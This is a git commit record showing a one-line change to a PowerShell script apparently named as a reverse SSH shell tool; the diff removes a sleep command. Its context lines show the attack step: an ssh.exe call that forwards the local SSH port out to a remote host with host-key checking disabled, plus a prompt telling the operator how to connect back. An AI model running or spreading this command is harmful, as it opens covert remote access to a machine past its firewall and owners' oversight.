4a2d387be872eae82abad3441500e08c3433b3d8
Arron Jablonowski <77128909+ArronJablonowski@users.noreply.github.com>
2021-02-19 02:07:23 -0600

    Update lol-reverseSSHell.ps1

--- lol-reverseSSHell.ps1
+++ lol-reverseSSHell.ps1
@@ -111,4 +111,4 @@ IF (!($sshServerStatus.State -eq "Installed")){
 # Reverse SSH connection to Remote Host
 Write-Verbose "On $DestinationHost type: ssh localhost -p $DestinationBindLocalPort" -Verbose
 ssh.exe -fN -R "$DestinationBindLocalPort`:127.0.0.1:22" "$DestinationUserName@$DestinationHost" -p $DestinationPort -i "$WinPrivateKey" -o "StrictHostKeyChecking=no"  # -vvv ## Uncomment '-vvv' to troubleshoot connections.
-Start-Sleep 10
+
